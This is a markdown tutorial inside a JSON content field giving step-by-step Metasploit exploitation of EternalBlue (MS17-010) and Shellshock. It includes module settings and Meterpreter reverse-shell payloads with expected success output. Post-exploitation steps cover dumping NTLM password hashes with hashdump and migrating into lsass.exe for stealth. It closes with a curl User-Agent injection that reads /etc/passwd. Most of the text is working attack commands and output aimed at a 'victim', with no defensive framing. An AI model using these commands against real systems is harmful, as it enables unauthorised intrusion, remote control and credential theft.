        "content": "#EternalBlue\n\n---\n\n### üöÄ Live Step-by-Step: EternalBlue Exploitation\n\n#### 1. Search and Load\n\nOpen your terminal and load the specific exploit module.\n\n```bash\nmsfconsole -q\nuse exploit/windows/smb/ms17_010_eternalblue\n\n```\n\n#### 2. Configure the Attack (Honing)\n\nYou must tell Metasploit who the victim is and where to send the shell back to.\n\n| Command | Live Example | Purpose |\n| --- | --- | --- |\n| **set RHOSTS** | `set RHOSTS 192.168.1.50` | The IP of the vulnerable Windows PC. |\n| **set LHOST** | `set LHOST 192.168.1.10` | Your Kali Linux IP address. |\n| **set PAYLOAD** | `set payload windows/x64/meterpreter/reverse_tcp` | Sets the 64-bit Meterpreter shell. |\n\n#### 3. Run the Attack\n\n```bash\nexploit\n\n```\n\n---\n\n### üñ•Ô∏è Live Output (The Success Screen)\n\nWhen you run the command, Metasploit will perform a series of \"pings\" and \"overwrites.\" Here is the exact output you expect to see:\n\n```text\n[*] 192.168.1.50:445 - Target OS: Windows 7 Professional 7601 Service Pack 1 x64\n[*] 192.168.1.50:445 - Connecting to target...\n[*] 192.168.1.50:445 - Connected to target, starting exploitation...\n[+] 192.168.1.50:445 - EternalBlue overwrite successful!\n[*] 192.168.1.50:445 - Sending payload...\n[*] Sending stage (200774 bytes) to 192.168.1.50\n[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.50:49158)\n\nmeterpreter > \n\n```\n\n---\n\n### üõ†Ô∏è Post-Exploitation: Verifying \"God Mode\"\n\nOnce the prompt changes to `meterpreter >`, you have full control. Run these commands immediately to verify your status:\n\n| Goal | Live Command | Output Expectation |\n| --- | --- | --- |\n| **Check Privileges** | `getuid` | `Server username: NT AUTHORITY\\SYSTEM` |\n| **Verify OS** | `sysinfo` | `OS: Windows 7 (6.1 Build 7601, Service Pack 1).` |\n| **Dump Passwords** | `hashdump` | Prints NTLM hashes of all users on the PC. |\n| **Stealth** | `migrate -n lsass.exe` | Moves your shell into the system login process for stability. |\n\n---\n\n### ‚ö†Ô∏è Common Failure Reasons (Troubleshooting)\n\n1. **Target Patched:** If you see `The target is not vulnerable`, the victim has installed the **MS17-010** security patch.\n2. **Architecture Mismatch:** If the target is 32-bit and you set a 64-bit payload, the system might crash (Blue Screen of Death). Use `show targets` to check.\n3. **Firewall:** If the connection hangs, the victim's firewall might be blocking port **445**.\n\n---\n\n#Shellshock\n\n\n\n### üöÄ Live Step-by-Step: Shellshock Exploitation\n\n#### 1. Search and Select\n\nOpen your terminal and search for the specific Apache module.\n\n```bash\nmsfconsole -q\nuse exploit/multi/http/apache_mod_cgi_bash_env_exec\n\n```\n\n#### 2. Configure the Target (Honing)\n\nYou must point Metasploit to the specific vulnerable script on the web server (usually found in `/cgi-bin/`).\n\n| Command | Example Value | Description |\n| --- | --- | --- |\n| **set RHOSTS** | `192.168.1.50` | The IP of the vulnerable web server. |\n| **set TARGETURI** | `/cgi-bin/vulnerable.sh` | **Crucial:** The path to the `.sh` or `.cgi` script. |\n| **set LHOST** | `192.168.1.10` | Your Kali Linux IP address. |\n\n#### 3. Run the Attack\n\n```bash\nexploit\n\n```\n\n---\n\n### üñ•Ô∏è Live Output (What you will see)\n\nIf the attack is successful, your terminal will display the following sequence:\n\n```text\n[*] Started reverse TCP handler on 192.168.1.10:4444 \n[*] Command Stager progress - 100.00% done (1097/1097 bytes)\n[*] Sending stage (984904 bytes) to 192.168.1.50\n[*] Meterpreter session 1 opened (192.168.1.10:4444 -> 192.168.1.50:42046) at 2025-12-19\n\nmeterpreter > \n\n```\n\n---\n\n### üõ†Ô∏è Table: Shellshock Attack Summary\n\n| Component | Setting / Command | Purpose |\n| --- | --- | --- |\n| **Module** | `apache_mod_cgi_bash_env_exec` | Targets the Bash environment variable flaw. |\n| **Vector** | `HTTP_USER_AGENT` | Metasploit injects the command into the User-Agent header. |\n| **Payload** | `linux/x86/meterpreter/reverse_tcp` | Provides a full interactive shell upon success. |\n| **Verification** | `getuid` | Run this after \"exploit\" to see your user level (often `www-data`). |\n\n---\n\n### ‚ö†Ô∏è Pro-Tip: Manual \"Live\" Test (Before Metasploit)\n\nBefore using Metasploit, you can verify if a URL is vulnerable using `curl`. If this returns the content of the `/etc/passwd` file, the target is 100% hackable:\n\n```bash\ncurl -H \"User-Agent: () { :; }; echo; /bin/cat /etc/passwd\" http://192.168.1.50/cgi-bin/vulnerable.sh\n\n```\n"
